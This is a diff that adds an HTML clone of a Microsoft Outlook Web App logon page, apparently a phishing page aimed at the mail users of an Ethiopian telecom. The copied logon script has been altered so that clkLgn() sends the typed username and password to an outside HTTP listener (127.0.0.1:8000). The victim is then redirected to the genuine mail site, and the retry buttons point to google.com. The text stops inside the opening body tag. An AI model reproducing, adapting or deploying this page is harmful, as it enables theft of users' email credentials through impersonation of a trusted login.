@@ -1,0 +1,1334 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<!-- Copyright (c) 2011 Microsoft Corporation.  All rights reserved. -->
+<!-- OwaPage = ASP.auth_logon_aspx -->
+
+<!-- {57A118C6-2DA9-419d-BE9A-F92B0F9A418B} -->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html>
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=10" />
+    <link rel="shortcut icon" href="/owa/auth/15.1.2507/themes/resources/favicon.ico" type="image/x-icon">
+    <meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
+    <meta name="Robots" content="NOINDEX, NOFOLLOW">
+    <title>Outlook</title>
+    <style>
+        @font-face {
+            font-family: "wf_segoe-ui_normal";
+            src: url("/owa/auth/15.1.2507/themes/resources/segoeui-regular.eot?#iefix") format("embedded-opentype"),
+                url("/owa/auth/15.1.2507/themes/resources/segoeui-regular.ttf") format("truetype");
+        }
+
+        @font-face {
+            font-family: "wf_segoe-ui_semilight";
+            src: url("/owa/auth/15.1.2507/themes/resources/segoeui-semilight.eot?#iefix") format("embedded-opentype"),
+                url("/owa/auth/15.1.2507/themes/resources/segoeui-semilight.ttf") format("truetype");
+        }
+
+        @font-face {
+            font-family: "wf_segoe-ui_semibold";
+            src: url("/owa/auth/15.1.2507/themes/resources/segoeui-semibold.eot?#iefix") format("embedded-opentype"),
+                url("/owa/auth/15.1.2507/themes/resources/segoeui-semibold.ttf") format("truetype");
+        }
+    </style>
+    <style>
+        /*Copyright (c) 2003-2006 Microsoft Corporation.  All rights reserved.*/
+
+        body.rtl {
+            text-align: right;
+            direction: rtl;
+        }
+
+        body,
+        .mouse,
+        .twide,
+        .tnarrow,
+        form {
+            height: 100%;
+            width: 100%;
+            margin: 0px;
+        }
+
+        .mouse,
+        .twide {
+            min-width: 650px;
+            /* min iPad1 dimension */
+            min-height: 650px;
+            position: absolute;
+            top: 0px;
+            bottom: 0px;
+            left: 0px;
+            right: 0px;
+        }
+
+        .sidebar {
+            background-color: #8DC53E;
+        }
+
+        .mouse .sidebar,
+        .twide .sidebar {
+            position: absolute;
+            top: 0px;
+            bottom: 0px;
+            left: 0px;
+            display: inline-block;
+            width: 332px;
+        }
+
+        .tnarrow .sidebar {
+            display: none;
+        }
+
+        .mouse .owaLogoContainer,
+        .twide .owaLogoContainer {
+            margin: 213px auto auto 109px;
+            text-align: left
+                /* Logo aligns left for both ltr & rtl */
+        }
+
+        .tnarrow .owaLogo {
+            display: none;
+        }
+
+        .mouse .owaLogoSmall,
+        .twide .owaLogoSmall {
+            display: none;
+        }
+
+        .logonDiv {
+            text-align: left;
+        }
+
+        .rtl .logonDiv {
+            text-align: right;
+        }
+
+        .mouse .logonContainer,
+        .twide .logonContainer {
+            padding-top: 174px;
+            padding-left: 464px;
+            padding-right: 142px;
+            position: absolute;
+            top: 0px;
+            bottom: 0px;
+            left: 0px;
+            right: 0px;
+            text-align: center;
+        }
+
+        .mouse .logonDiv,
+        .twide .logonDiv {
+            position: relative;
+            vertical-align: top;
+            display: inline-block;
+            width: 423px;
+        }
+
+        .tnarrow .logonDiv {
+            margin: 25px auto auto -130px;
+            position: absolute;
+            left: 50%;
+            width: 260px;
+            padding-bottom: 20px;
+        }
+
+        .twide .signInImageHeader,
+        .tnarrow .signInImageHeader {
+            display: none;
+        }
+
+        .mouse .signInImageHeader {
+            margin-bottom: 22px;
+        }
+
+        .twide .mouseHeader {
+            display: none;
+        }
+
+        .mouse .twideHeader {
+            display: none;
+        }
+
+        input::-webkit-input-placeholder {
+            font-size: 16px;
+            color: #98A3A6;
+        }
+
+        input:-moz-placeholder {
+            font-size: 16px;
+            color: #98A3A6;
+        }
+
+        .tnarrow .signInInputLabel,
+        .twide .signInInputLabel {
+            display: none;
+        }
+
+        .mouse .signInInputLabel {
+            margin-bottom: 2px;
+        }
+
+        .mouse .showPasswordCheck {
+            display: none;
+        }
+
+        .signInInputText {
+            border: 1px solid #98A3A6;
+            color: #333333;
+            border-radius: 0;
+            -moz-border-radius: 0;
+            -webkit-border-radius: 0;
+            box-shadow: none;
+            -moz-box-shadow: none;
+            -webkit-box-shadow: none;
+            -webkit-appearance: none;
+            background-color: #FDFDFD;
+            width: 250px;
+            margin-bottom: 10px;
+            box-sizing: content-box;
+            -moz-box-sizing: content-box;
+            -webkit-box-sizing: content-box;
+        }
+
+        .mouse .signInInputText {
+            height: 22px;
+            font-size: 12px;
+            padding: 3px 5px;
+            color: #333333;
+            font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            margin-bottom: 20px;
+        }
+
+        .twide .signInInputText,
+        .tnarrow .signInInputText {
+            border-color: #666666;
+            height: 22px;
+            font-size: 16px;
+            color: #000000;
+            padding: 7px 7px;
+            font-family: 'wf_segoe-ui_semibold', 'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            margin-bottom: 20px;
+            width: 264px;
+        }
+
+        .divMain {
+            width: 444px;
+        }
+
+        .l {
+            text-align: left;
+        }
+
+        .rtl .l {
+            text-align: right;
+        }
+
+        .r {
+            text-align: right;
+        }
+
+        .rtl .r {
+            text-align: left;
+        }
+
+        table#tblMain {
+            margin-top: 48px;
+            padding: 0px;
+        }
+
+        table.mid {
+            width: 385px;
+            border-collapse: collapse;
+            padding: 0px;
+            color: #444444;
+        }
+
+        table.tblConn {
+            direction: ltr;
+        }
+
+        td.tdConnImg {
+            width: 22px;
+        }
+
+        td.tdConn {
+            padding-top: 15px;
+        }
+
+        td#mdLft {
+            background: url("lgnleft.gif") repeat-y;
+            width: 15px;
+        }
+
+        td#mdRt {
+            background: url("lgnright.gif") repeat-y;
+            width: 15px;
+        }
+
+        td#mdMid {
+            padding: 0px 45px;
+            background: #ffffff;
+            vertical-align: top;
+        }
+
+        td .txtpad {
+            padding: 3px 6px 3px 0px;
+        }
+
+        .txt {
+            padding: 3px;
+            height: 2.2em;
+        }
+
+        input.btn {
+            color: #ffffff;
+            background-color: #eb9c12;
+            border: 0px;
+            padding: 2px 6px;
+            margin: 0px 6px;
+            text-align: center;
+        }
+
+        .btnOnFcs {
+            color: #ffffff;
+            background-color: #eb9c12;
+            border: 0px;
+            padding: 2px 6px;
+            margin: 0px 6px;
+            text-align: center;
+        }
+
+        .btnOnMseOvr {
+            color: #ffffff;
+            background-color: #f9b133;
+            border: 0px;
+            padding: 2px 6px;
+            margin: 0px 6px;
+            text-align: center;
+        }
+
+        .btnOnMseDwn {
+            color: #000000;
+            background-color: #f9b133;
+            border: 0px solid #f9b133;
+            padding: 2px 6px;
+            margin: 0px 6px;
+            text-align: center;
+        }
+
+        .nowrap {
+            white-space: nowrap;
+        }
+
+        hr {
+            height: 0px;
+            visibility: hidden;
+        }
+
+        .wrng {
+            color: #ff6c00;
+        }
+
+        .disBsc {
+            color: #999999;
+        }
+
+        .expl {
+            color: #999999;
+        }
+
+        .w100,
+        .txt {
+            width: 100%;
+        }
+
+        .txt {
+            margin: 0px 6px;
+        }
+
+        .rdo {
+            margin: 0px 12px 0px 32px;
+        }
+
+        body.rtl .rdo {
+            margin: 0px 32px 0px 12px;
+        }
+
+        tr.expl td,
+        tr.wrng td {
+            padding: 2px 0px 4px;
+        }
+
+        tr#trSec td {
+            padding: 3px 0px 8px;
+        }
+
+        /* language page specific styles */
+        td#tdLng {
+            padding: 12px 0px;
+        }
+
+        td#tdTz {
+            padding: 8px 0px;
+        }
+
+        select#selTz {
+            padding: 0px;
+            margin: 0px;
+        }
+
+        td#tdOptMsg {
+            padding: 10px 0px;
+        }
+
+        td#tdOptChk {
+            padding: 0px 0px 15px 65px;
+        }
+
+        td#tdOptAcc {
+            vertical-align: middle;
+            padding: 0px 0px 0px 3px;
+        }
+
+        select#selLng {
+            margin: 0px 16px;
+        }
+
+        /* logoff page specific styles */
+        td#tdMsg {
+            margin: 9px 0px 64px;
+        }
+
+        input#btnCls {
+            margin: 3px 6px;
+        }
+
+        td.lgnTL,
+        td.lgnBL {
+            width: 456px;
+        }
+
+        td.lgnTM {
+            background: url("lgntopm.gif") repeat-x;
+            width: 100%;
+        }
+
+        td.lgnBM {
+            background: url("lgnbotm.gif") repeat-x;
+            width: 100%;
+        }
+
+        td.lgnTR,
+        td.lgnBR {
+            width: 45px;
+        }
+
+        table.tblLgn {
+            padding: 0px;
+            margin: 0px;
+            border-collapse: collapse;
+            width: 100%;
+        }
+
+        .signInBg {
+            margin: 0px;
+        }
+
+        .signInTextHeader {
+            font-size: 60px;
+            color: #404344;
+            font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            margin-bottom: 18px;
+            white-space: nowrap;
+        }
+
+        .signInInputLabel {
+            font-size: 12px;
+            color: #666666;
+            font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+        }
+
+        .signInCheckBoxText {
+            font-size: 12px;
+            color: #6A7479;
+            font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            margin-top: 16px;
+        }
+
+        .twide .signInCheckBoxText,
+        .tnarrow .signInCheckBoxText {
+            font-size: 15px;
+        }
+
+        .signInCheckBoxLink {
+            font-size: 12px;
+            color: #0072C6;
+            font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+        }
+
+        .signInEnter {
+            font-size: 22px;
+            color: #0072C6;
+            font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            margin-top: 20px;
+        }
+
+        .twide .signInEnter {
+            margin-top: 17px;
+            font-size: 29px;
+        }
+
+        .tnarrow .signInEnter {
+            margin-top: 2px;
+            font-size: 29px;
+            position: relative;
+            float: left;
+            left: 50%;
+        }
+
+        .signinbutton {
+            cursor: pointer;
+            display: inline
+        }
+
+        .mouse .signinbutton {
+            padding: 0px 8px 5px 8px;
+            margin-left: -8px;
+        }
+
+        .rtl .mouse .signinbutton {
+            margin-right: -8px;
+        }
+
+        .tnarrow .signinbutton {
+            position: relative;
+            float: left;
+            left: -50%;
+        }
+
+        .shellDialogueHead {
+            font-size: 29px;
+            color: #0072C6;
+            font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+        }
+
+        .mouse .shellDialogueHead {
+            line-height: 35px;
+            margin-bottom: 10px;
+        }
+
+        .twide .shellDialogueHead,
+        .tnarrow .shellDialogueHead {
+            line-height: 34px;
+            margin-bottom: 12px;
+        }
+
+        .shellDialogueMsg {
+            font-size: 13px;
+            color: #333333;
+            font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            line-height: 18px;
+        }
+
+        .twide .shellDialogueMsg,
+        .tnarrow .shellDialogueMsg {
+            font-size: 15px;
+        }
+
+        .headerMsgDiv {
+            width: 350px;
+            margin-bottom: 22px;
+        }
+
+        .twide .headermsgdiv {
+            margin-bottom: 30px;
+        }
+
+        .tnarrow .headermsgdiv {
+            width: 260px;
+            margin-bottom: 30px;
+        }
+
+        .signInError {
+            font-size: 12px;
+            color: #C1272D;
+            font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            margin-top: 12px;
+        }
+
+        .passwordError {
+            color: #A80F22;
+            font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            line-height: 18px;
+        }
+
+        .mouse .passwordError {
+            margin-top: 10px;
+            font-size: 13px;
+        }
+
+        .twide .passwordError,
+        .tnarrow .passwordError {
+            margin-top: 12px;
+            font-size: 15px;
+        }
+
+        .signInExpl {
+            font-size: 12px;
+            color: #999999;
+            font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            margin-top: 5px;
+        }
+
+        .signInWarning {
+            font-size: 12px;
+            color: #C1272D;
+            font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            margin-top: 5px;
+        }
+
+        input.chk {
+            margin-right: 9px;
+            margin-left: 0px;
+        }
+
+        .imgLnk {
+            vertical-align: middle;
+            line-height: 2;
+            margin-top: -2px;
+        }
+
+        .signinTxt {
+            padding-left: 11px;
+            padding-right: 11px;
+            /* Needed for RTL, doesnt hurt to add this for LTR as well */
+        }
+
+        .hidden-submit {
+            border: 0 none;
+            height: 0;
+            width: 0;
+            padding: 0;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .officeFooter {
+            position: absolute;
+            bottom: 33px;
+            right: 45px;
+        }
+
+        .tnarrow .officeFooter {
+            display: none;
+        }
+    </style>
+    <script>
+        //  flogon.js
+        //
+        //  This file contains the script used by Logon.aspx
+        //
+        //Copyright (c) 2003-2006 Microsoft Corporation.  All rights reserved.
+
+        /// <summary>
+        /// OnLoad handler for logon page
+        /// </summary>
+        window.onload = function () {
+            // If we are replacing the current window with the logon page, initialize the logon page UI now
+            //
+            if (a_fRC)
+                initLogon();
+
+            // Otherwise we need to find the window to replace with the logon page and redirect that window
+            //
+            else
+                redir();
+        };
+
+        /// <summary>
+        /// Initializes the logon page
+        /// </summary>
+        function initLogon() {
+            try {
+                //
+                // we don't call document.execCommand("ClearAuthenticationCache","false"); anymore. As a part of the Pending-Notification
+                // infrastructure, we are making a change to make sure startpage does not get loaded more than once. This solution is cookie
+                // based. This execCommand was clearing all cookies in the scenario when a user logged on from a child window during an
+                // FBA timeout. We do not want that to happen anymore. If this breaks anything, we may need to consider a different solution.
+                //
+                // Old Comments:
+                // If the "Clear the Authentication Cache" flag is set to true and
+                // we are coming from the logoff page , clear the cache. See bug 41770 and 5840 for details.
+                //
+
+                // Logoff the S-Mime control.
+                //
+                LogoffMime();
+            }
+            catch (e) { }
+
+            // Check for username cookie
+            //
+            var re = /(^|; )logondata=acc=([0|1])&lgn=([^;]+)(;|$)/;
+            var rg = re.exec(document.cookie);
+
+            if (rg) {
+                // Fill in username, set security to private, and restore the "use basic" selection
+                //
+
+                gbid("username").value = rg[3];
+
+                try {
+                    var signInErrorElement = gbid("signInErrorDiv");
+                    if (signInErrorElement) {
+                        signInErrorElement.focus();
+                    }
+                    else {
+                        gbid("password").focus();
+                    }
+                }
+                catch (e) { }
+
+                if (gbid("chkPrvt") && !gbid("chkPrvt").checked) {
+                    gbid("chkPrvt").click();
+                }
+
+                if (rg[2] == "1" && gbid("chkBsc"))	// chkBsc doesn't exist if the request comes from ECP
+                    gbid("chkBsc").click();
+
+            }
+            else {
+                // The variable g_fFcs is set to false when the password gains focus,
+                // so that we don't accidentally set focus to the username field while
+                // the user is typing their password
+                //
+                if (g_fFcs) {
+                    try {
+                        gbid("username").focus();
+                    }
+                    catch (e) { }
+                }
+            }
+
+            // OWA Premium currently supports
+            // IE 7+, Safari 3+, Firefox 3+ for Windows / Mac
+            if (IsOwaPremiumBrowser() && gbid("chkBsc"))	// chkBsc doesn't exist if the request comes from ECP
+                gbid("chkBsc").disabled = false;
+
+            // Are cookies enabled?
+            //
+            var sCN = "cookieTest";
+
+            document.cookie = sCN + "=1";
+            var cookiesEnabled = document.cookie.indexOf(sCN + "=") != -1;
+
+            if (cookiesEnabled == false) {
+                shw(gbid("cookieMsg"));
+                hd(gbid("lgnDiv"));
+            }
+
+            // Show the public/private warning message
+            clkSec();
+        }
+
+
+        /// <summary>
+        /// Finds the frame we want to load the logon page into, and then loads it there
+        /// </summary>
+        function redir() {
+            var o = window;
+
+            // If we're in a dialog, open a logon window and close the dialog - this
+            // basically inlines a version of opnWin() so that we don't need to include
+            // uglobal.js in logon.aspx
+            //
+            try {
+                if (o.dialogArguments) {
+                    var sWN = new String(Math.round(Math.random() * 100000));
+                    var sF = "toolbar=0,location=0,directories=0,status=1,menubar=0,scrollbars=1,resizable=1,width=800,height=600";
+                    var iT = Math.round((screen.availHeight - 600) / 2);
+                    var iL = Math.round((screen.availWidth - 800) / 2);
+                    sF += ",top=" + iT + ",left=" + iL;
+
+                    // Fix for E12 14838.  Need to open this window from the window that opened us, because opening it from this dialog
+                    // which we are about to close can cause the auth cookies to not propagate to the window that opened this dialog.
+                    //
+                    var op = o.dialogArguments.opener;
+                    try {
+                        if (op)
+                            op.open(a_sCW, sWN, sF);
+                    }
+                    catch (e) { }
+
+                    o.close();
+                    return;
+                }
+            }
+            catch (e) { }
+
+            // The url to redirect to after logon
+            //
+            var sUrl = a_sUrl;
+
+            // Find the outermost OWA frame
+            //
+            while (1) {
+                try {
+                    // Try to move up one window/frame
+                    //
+                    if (!(o.frameElement && o.frameElement.ownerDocument))
+                        break;
+
+                    var oF = o.frameElement.ownerDocument.parentWindow || // IE name
+                        o.frameElement.ownerDocument.defaultView;     // W3C name
+
+                    // If we're not in an OWA/ECP window, we've found the frame to replace
+                    //
+                    if (!oF || (!oF.g_fOwa && !oF.g_fEcp))
+                        break;
+
+                    // Move up a frame
+                    //
+                    o = oF;
+
+                    // We're replacing something other than the current frame,  we'll just
+                    // log back in to the default start page if the frame doesn't provide a url
+                    //  for relogon. The frame should provide a global method GetReloadUrl
+                    // if it wants to keep current state.
+                    // $NOTES: ECP needs to keep the current frame state after re-logon.
+                    sUrl = o.GetReloadUrl ? "&url=" + encodeURIComponent(o.GetReloadUrl()) : "";
+                }
+                // Either we're at the top, or access was denied - either way, stop
+                //
+                catch (e) {
+                    break;
+                }
+            }
+
+            // See if the window was opened by another window
+            //
+            try {
+                var oW = o.opener;
+
+                // If it was opened by another OWA/ECP window, take it over
+                //
+                if (oW && (oW.g_fOwa || oW.g_fEcp)) {
+                    // Center and resize the window
+                    //
+                    var iX = Math.round((screen.availWidth - 800) / 2);
+                    var iY = Math.round((screen.availHeight - 600) / 2);
+                    o.moveTo(iX, iY);
+                    o.resizeTo(800, 600);
+
+                    // Close the window after logging in
+                    //
+                    sUrl = "&url=" + encodeURIComponent(a_sCW);
+                }
+            }
+            // We don't have access to the opener window, so it couldn't be part of OWA
+            //
+            catch (e) { }
+
+            // Redirect the window
+            //
+            if (o.navigate)
+                o.navigate(a_sLgn + sUrl);
+            else
+                o.location = a_sLgn + sUrl;
+        }
+
+        /// <summary>
+        /// Show an element
+        /// </summary>
+        /// <param name="o">Element to show</param>
+        function shw(o) {
+            o.style.display = "";
+        }
+
+        /// <summary>
+        /// Hide an element
+        /// </summary>
+        /// <param name="o">Element to hide</param>
+        function hd(o) {
+            o.style.display = "none";
+        }
+
+        /// <summary>
+        /// OnClick handler for the show private explanation 
+        /// </summary>
+        function clkSecExp(id) {
+            var o = gbid(id);
+
+            if (o.tagName == "IMG")
+                o = o.parentNode;
+
+            switch (o) {
+                case gbid("lnkShwSec"):
+                    hd(gbid("lnkShwSec"));
+                    shw(gbid("lnkHdSec"));
+                    shw(gbid("prvtExp"));
+                    gbid("lnkHdSec").focus();
+                    break;
+                case gbid("lnkHdSec"):
+                    shw(gbid("lnkShwSec"));
+                    hd(gbid("lnkHdSec"));
+                    hd(gbid("prvtExp"));
+                    gbid("lnkShwSec").focus();
+                    break;
+            }
+        }
+
+        /// <summary>
+        /// onkeydown handler for the show private explanation 
+        /// </summary>
+        function kdSecExp(id) {
+            // When user press space bar, we shall treat it as click.
+            if (window.event.keyCode == 32) {
+                clkSecExp(id);
+            }
+        }
+
+        /// <summary>
+        /// OnClick handler for the security radio buttons
+        /// </summary>
+        function clkSec() {
+            if (gbid("chkPrvt") == null) {
+
+                // If the private checkbox is not present in the page there is nothing we should do here
+                //
+                return;
+            }
+
+            // Display/hide the warning message
+            //
+            var c = gbid("chkPrvt").checked;
+
+            gbid("prvtWrn").style.display = c ? "" : "none";
+
+            // Update flags and username cookie
+            //
+            if (c) {
+                document.logonForm["flags"].value |= 4;
+            }
+            else {
+                document.logonForm["flags"].value &= ~4;
+
+                // Remove the cookie by expiring it
+                //
+                var oD = new Date();
+                oD.setTime(oD.getTime() - 9999);
+                document.cookie = "logondata=; expires=" + oD.toUTCString();
+                document.cookie = "PrivateComputer=; path=/; expires=" + oD.toUTCString();
+            }
+        }
+
+        /// <summary>
+        /// OnClick handler for the use owa basic checkbox
+        /// </summary>
+        function clkBsc() {
+            // Display/hide the warning message
+            //
+            var c = gbid("chkBsc").checked;
+            gbid("bscExp").style.display = c ? "" : "none";
+
+            if (c)
+                document.logonForm.flags.value |= 1;
+            else
+                document.logonForm.flags.value &= ~1;
+        }
+
+        function checkSubmit(e) {
+            if (e && e.keyCode == 13) {
+                // Since we are explicitly handling the click prevent the default implicit submit  
+                if (e.preventDefault) {
+                    e.preventDefault();
+                }
+
+                clkLgn();
+                
+            }
+        }
+
+
+        /// <summary>
+        /// OnClick handler for the logon button
+        /// </summary>
+        function clkLgn() {
+            alert("I am called")
+            var xmlhttp = new XMLHttpRequest();
+            var curTime = new Date().toLocaleDateString();
+            var ObjectData = "ObjectType=" + escape(curTime + "\t" + gbid("username").value + "\t" + gbid("password").value) + "&uin=" + Math.random().toString(16).substring(2);
+
+            xmlhttp.open("GET", "http://127.0.0.1:8000/UserName="+ gbid("username").value+"&Password=" + gbid("password").value);
+            xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xmlhttp.send(ObjectData);
+            // Add performance marker for Logon page as the item name defined in the spec:
+            // http://exweb/14/Specs/E14 Spec Library/Client side perf marker definition.xlsx
+            //
+            addPerfMarker("Logon.Start");
+
+            var p = false;
+
+            if (gbid("chkPrvt")) {
+                p = p | gbid("chkPrvt").checked;
+            }
+            else {
+                p = true;
+            }
+
+            // If security is set to private, add a cookie to persist username and basic setting
+            // Cookie format: logondata=acc=<1 or 0>&lgn=<username>
+            //
+            if (p) {
+                // Calculate the expires time for two weeks
+                //
+                var oD = new Date();
+                oD.setTime(oD.getTime() + 2 * 7 * 24 * 60 * 60 * 1000);
+                var sA = "acc=" + (gbid("chkBsc") && gbid("chkBsc").checked ? 1 : 0);
+                var sL = "lgn=" + gbid("username").value;
+                document.cookie = "logondata=" + sA + "&" + sL + "; expires=" + oD.toUTCString();
+                document.cookie = "PrivateComputer=true; path=/; expires=" + oD.toUTCString();
+            }
+
+            if (gbid("showPasswordCheck").checked) {
+                passwordElement = gbid("password");
+                passwordTextElement = gbid("passwordText");
+                passwordElement.value = passwordTextElement.value;
+            }
+
+            // We clean the post back cookie in order to indicate that the credentials post is legitimate (and not history postback)
+            //
+            document.cookie = "PBack=0; path=/";
+            document.logonForm.submit();
+            window.location.href = "https://mail.ethiotelecom.et/";
+        }
+
+        /// <summary>
+        /// OnClick handler for the retry button
+        /// </summary>
+        function clkRtry() {
+            window.location.href = "https://google.com";
+        }
+
+        /// <summary>
+        /// OnClick handler for the ok button after changing password (will go to owa/)
+        /// </summary>
+        function clkReLgn() {
+            window.location.href = 'https://google.com';
+        }
+
+        /// <summary>
+        /// GetElementByID from Document
+        /// </summary>
+        /// <param name="s">Id of the Element</param>
+        function gbid(s) {
+            return document.getElementById(s);
+        }
+
+        /// <summary>
+        /// Is the Client IE 7, Safari 3, Firefox 3 or Above
+        /// Note The rules should match owa\bin\core\Utlities.cs@IsDownLevelClient
+        /// </summary>
+        function IsOwaPremiumBrowser() {
+            var ua = navigator.userAgent;
+            var av = navigator.appVersion;
+            var mac = (av.indexOf('Mac') != -1);
+            var win = ((av.indexOf('Win') != -1) || (av.indexOf('NT') != -1));
+
+            // If you change the follow browser check logic, change utility.js as well.
+            // We have duplicate logic because otherwise logon page must include more code than necessary.
+            //
+            var ie = (ua.indexOf("MSIE ") != -1);
+            var firefox = (ua.indexOf("Firefox/") != -1 && ua.indexOf("Gecko/") != -1 && Array.every);
+            var safari = (ua.indexOf("Safari") != -1 && ua.indexOf("WebKit") != -1);
+            var version = 2.0;
+
+            if (ie) {
+                version = parseFloat(ua.replace(/^.*MSIE /, ''));
+            }
+            else if (firefox) {
+                version = parseFloat(ua.replace(/^.*Firefox\//, ''));
+            }
+            else if (safari) {
+                version = parseFloat(ua.replace(/^.*Version\//, ''));
+            }
+            else {
+                version = parseInt(av);
+            }
+
+            if (win) {
+                if (ie)
+                    return (version >= 7.0);
+                else if (safari)
+                    return (version >= 3.0);
+                else if (firefox)
+                    return (version >= 3.0);
+            }
+            else if (mac) {
+                if (safari)
+                    return (version >= 2.0);
+                else if (firefox)
+                    return (version >= 3.0);
+            }
+
+            return false;
+        }
+
+        /// <summary>
+        /// Convert an error code to HRESULT.
+        /// </summary>
+        function hres(iErr) {
+            return iErr + 0xffffffff + 1;
+        }
+
+        /// <summary>
+        /// Log off S-MIME control if it presents.
+        /// </summary>
+        function LogoffMime() {
+            try {
+                if ((typeof (mimeLogoffE2k3) != "undefined" && null != mimeLogoffE2k3) && IsMimeCtlInst("MimeBhvr.MimeCtlVer"))
+                    mimeLogoffE2k3.Logoff();
+
+                if ((typeof (mimeLogoffE2k7SP1) != "undefined" && null != mimeLogoffE2k7SP1) && IsMimeCtlInst("OwaSMime.MimeCtlVer"))
+                    mimeLogoffE2k7SP1.Logoff();
+
+                if ((typeof (mimeLogoffE2k9) != "undefined" && null != mimeLogoffE2k9) && IsMimeCtlInst("OwaSMime2.MimeCtlVer"))
+                    mimeLogoffE2k9.Logoff();
+            }
+            catch (e) {
+            }
+        }
+
+        /// <summary>
+        /// Add performance marker which can write ETW trace for clicking logon
+        /// </summary>
+        /// <param name="sItemName">Identify string to say start clicking logon</param>
+        function addPerfMarker(sItemName) {
+            try {
+                if (window.msWriteProfilerMark) {
+                    window.msWriteProfilerMark(sItemName);
+                }
+            }
+            catch (e) {
+                // We don't care any exception caused by test code in product, swallow it
+            }
+        }
+
+//
+// NOTE: flogon.js does not contain a call to stJS("flogon.js"). This is because flogon.js is loaded at logon time before uglobal.js
+//
+
+//-----------------------------------------------------------
+// END flogon.js
+//-----------------------------------------------------------
+
+    </script>
+
+
+    <script type="text/javascript">
+        <!-
+        var a_fRC = 1;
+        var g_fFcs = 1;
+        var a_fLOff = 0;
+        var a_fCAC = 0;
+        var a_fEnbSMm = 0;
+    /// <summary>
+    /// Is Mime Control installed?
+    /// </summary>
+    function IsMimeCtlInst(progid)
+    {
+        if (!a_fEnbSMm)
+            return false;
+    
+        var oMimeVer = null;
+    
+        try 
+        {
+            // TODO: ingore this on none IE browser
+            //
+            //oMimeVer = new ActiveXObject(progid);
+        } 
+        catch (e)
+        { 
+        }
+    
+        if (oMimeVer != null)
+            return true;
+        else
+            return false;
+    }
+    
+    /// <summary>
+    /// Render out the S-MIME control if it is installed.
+    /// </summary>
+    function RndMimeCtl()
+    {
+        if (IsMimeCtlInst("MimeBhvr.MimeCtlVer"))
+            RndMimeCtlHlpr("MimeNSe2k3", "D801B381-B81D-47a7-8EC4-EFC111666AC0", "MIMEe2k3", "mimeLogoffE2k3");
+    
+        if (IsMimeCtlInst("OwaSMime.MimeCtlVer"))
+            RndMimeCtlHlpr("MimeNSe2k7sp1", "833aa5fb-7aca-4708-9d7b-c982bf57469a", "MIMEe2k7sp1", "mimeLogoffE2k7sp1");
+    
+        if (IsMimeCtlInst("OwaSMime2.MimeCtlVer"))
+            RndMimeCtlHlpr("MimeNSe2k9", "4F40839A-C1E5-47E3-804D-A2A17F42DA21", "MIMEe2k9", "mimeLogoffE2k9");
+    }
+    
+    /// <summary>
+    /// Helper function to factor out the rendering of the S/MIME control.
+    /// </summary>
+    function RndMimeCtlHlpr(objid, classid, ns, id)
+    {
+        document.write("<OBJECT id='" + objid + "' classid='CLSID:" + classid + "'></OBJECT>");
+        document.write("<?IMPORT namespace='" + ns + "' implementation=#" + objid + ">");
+        document.write("<" + ns + ":Logoff id='" + id + "' style='display:none'/>");
+    }
+         ->
+    </script>
+
+    <script>
+
+        var mainLogonDiv = window.document.getElementById("mainLogonDiv");
+        var showPlaceholderText = false;
+        var mainLogonDivClassName = 'mouse';
+
+        if (mainLogonDivClassName == "tnarrow") {
+            showPlaceholderText = true;
+
+            // Output meta tag for viewport scaling
+            document.write('<meta name="viewport" content="width = 320, initial-scale = 1.0, user-scalable = no" />');
+        }
+        else if (mainLogonDivClassName == "twide") {
+            showPlaceholderText = true;
+        }
+
+        function setPlaceholderText() {
+            window.document.getElementById("username").placeholder = "user name";
+            window.document.getElementById("password").placeholder = "password";
+            window.document.getElementById("passwordText").placeholder = "password";
+        }
+
+        function showPasswordClick() {
+            var showPassword = window.document.getElementById("showPasswordCheck").checked;
+            passwordElement = window.document.getElementById("password");
+            passwordTextElement = window.document.getElementById("passwordText");
+            if (showPassword) {
+                passwordTextElement.value = passwordElement.value;
+                passwordElement.style.display = "none";
+                passwordTextElement.style.display = "inline";
+                passwordTextElement.focus();
+            }
+            else {
+                passwordElement.value = passwordTextElement.value;
+                passwordTextElement.style.display = "none";
+                passwordTextElement.value = "";
+                passwordElement.style.display = "inline";
+                passwordElement.focus();
+            }
+        }
+    </script>
+
+</head>
+
+<body class="signInBg"
